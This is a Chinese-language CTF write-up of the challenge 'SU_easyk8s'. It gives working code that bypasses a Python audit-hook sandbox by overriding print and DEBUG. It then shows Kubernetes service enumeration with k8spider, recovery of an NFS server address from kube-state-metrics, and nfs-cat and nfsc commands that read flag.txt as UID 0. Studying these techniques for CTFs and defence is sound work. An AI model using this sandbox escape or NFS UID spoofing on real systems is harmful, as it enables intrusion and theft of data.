# SU_easyk8s

## 题目简述

题目提供了一个在线 Python 执行器：后端使用 `python -i audit.py` 启动交互式解释器，再把用户提交的代码写入其标准输入。`audit.py` 注册了 Python 审计钩子，试图禁止 `os.system`、`subprocess.Popen`、`os.execve`、`os.fork` 和 `ctypes.dlopen` 等危险事件。

但取得命令执行并不是终点。应用运行在 Kubernetes 集群中，容器的普通用户权限和题目部署方式使本地文件系统里没有 flag。真正的攻击链是：

1. 绕过 Python 审计钩子取得容器内命令执行；
2. 枚举集群内服务并读取 `kube-state-metrics`；
3. 从指标中恢复 NFS PersistentVolume 的服务器和导出路径；
4. 通过 NFSv3 客户端以 UID 0 读取共享存储中的 `flag.txt`。

因此，本题的决定性障碍是 Kubernetes 信息泄露到共享存储的跨资源利用，而不是单一的 Python 沙箱绕过。

## 解题过程

### 1. 确认审计钩子的状态缺陷

后端每次收到代码后都会启动：

```python
cmd = [sys.executable, "-i", f"{os.getcwd()}/audit.py"]
p = subprocess.Popen(
    cmd,
    stdin=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    stdout=subprocess.PIPE,
)
return p.communicate(input=code.encode("utf-8"))[0]
```

审计函数在每次事件发生时重新创建 `audit_functions` 局部字典，然后才检查相应事件的 `ban` 字段：

```python
def audit_hook(event, args):
    audit_functions = {
        "os.system": {"ban": True},
        "subprocess.Popen": {"ban": True},
        "_posixsubprocess.fork_exec": {"ban": True},
        # 其余条目省略
    }

    if event in audit_functions:
        if DEBUG:
            print(f"[DEBUG] found event {event}")
        policy = audit_functions[event]
        if policy["ban"]:
            raise PermissionError(f"[AUDIT BANNED]{event} is not allowed.")
```

交互式解释器执行用户代码时，与 `audit.py` 共用全局命名空间。因此可以把全局 `DEBUG` 改为 `True`，再用自定义 `print` 覆盖审计函数调用的全局名称。审计钩子处理 `os.system` 时会先执行调试输出；此时自定义 `print` 可以通过上一层栈帧取得当前调用的 `audit_functions`，把 `os.system` 的策略改为允许：

```python
DEBUG = True

import os
import sys

original_print = print

def print(*args):
    policies = sys._getframe(1).f_locals["audit_functions"]
    policies["os.system"]["ban"] = False
    return original_print(*args)

os.system("id; uname -a; cat /etc/resolv.conf")
```

执行顺序很关键：

1. `os.system` 触发审计事件；
2. `DEBUG=True` 使审计函数调用被覆盖的 `print`；
3. 自定义 `print` 修改本次审计调用栈帧里的局部字典；
4. 审计函数随后读取到 `ban=False`，不再抛出异常；
5. `os.system` 正常执行。

这不是删除全局审计钩子，而是利用可变的逐次局部策略和可覆盖的调试函数，在检查发生前篡改本次决策。

### 2. 枚举集群内服务

获得容器内执行能力后，应先确认 DNS、路由和可用工具，而不是直接假设拥有 Kubernetes API 权限。赛时环境中，完整服务网段枚举容易超时，但集群 DNS 仍可响应。官方解法按 `/24` 缩小候选范围，循环使用 `k8spider` 枚举服务：

```bash
for i in $(seq 1 254); do
    ./k8spider all -c "10.43.${i}.1/24" -i 20000 >> res
done
```

结果中最有价值的目标是：

```text
kube-state-metrics.lens-metrics.svc.cluster.local:8080
```

容器内可用 `curl`，于是读取其指标：

```bash
curl -s \
  http://kube-state-metrics.lens-metrics.svc.cluster.local:8080/metrics \
  -o /tmp/metrics
```

这里的目标不是盲目扫描所有端口，而是从 Kubernetes 的结构化指标中寻找资源关系，尤其是 PersistentVolume、Secret、Pod 和 Service 等对象。

### 3. 从指标中恢复 NFS PersistentVolume

在指标文本中可以找到 `kube_persistentvolume_info`，其中直接泄露了 NFS 后端：

```text
kube_persistentvolume_info{
  persistentvolume="nfs-pv",
  storageclass="nfs-client",
  nfs_server="0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com",
  nfs_path="/nfs-root/"
} 1
```

仓库中的 `pv.yaml` 与这条运行时证据相互印证：

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
  name: nfs-pv
spec:
  storageClassName: nfs-client
  mountOptions:
    - hard
    - nfsvers=4
  nfs:
    path: /nfs-root/
    server: 0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com
```

此时已经获得了访问共享存储所需的两个关键参数：NFS 服务器地址和导出路径。flag 不必位于当前 Pod 的挂载点；只要网络可达 NFS 服务，就可以直接从协议层访问导出目录。

### 4. 通过 NFS 读取 flag

将流量转发到能够访问 NFS 服务的网络后，可以使用支持 NFS URL 的工具列目录并读取文件：

```bash
nfs-ls \
  "nfs://0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com/?uid=0"

nfs-cat \
  "nfs://0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com/flag.txt?uid=0"
```

也可以使用仓库附带的 Go NFS 客户端：

```bash
nfsc \
  "0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com:/" \
  "root:0:0" \
  ls

nfsc \
  "0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com:/" \
  "root:0:0" \
  down flag.txt

cat flag.txt
```

附带客户端原版的下载逻辑存在创建本地文件失败的问题，仓库版本将其修正为：

```go
f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0777)
```

官方材料只记录了从赛时 NFS 实例读取 `flag.txt` 的过程，没有保存 flag 的具体值；因此本文不凭空补写字符串。

## 方法总结

本题由三个相互衔接的信任边界构成：

1. Python 审计钩子把可变策略放在局部字典中，又在策略检查前调用可被用户覆盖的全局 `print`，导致用户能够修改当前审计决策；
2. 容器取得命令执行后虽没有直接读取 Kubernetes 控制面的凭据，却可以访问集群 DNS 和 `kube-state-metrics`，由指标重建资源信息；
3. 指标公开了 NFS PV 的服务器与导出路径，而 NFS 服务又接受由客户端声明的 UID，最终使共享卷中的 flag 可被直接读取。

处理类似题目时，应把“应用 RCE”“集群可见性”“工作负载身份”“共享存储访问”分别验证。拿到容器 shell 只代表突破了应用边界，并不等同于已经取得目标数据；结构化指标和存储配置往往才是最短的后续路径。
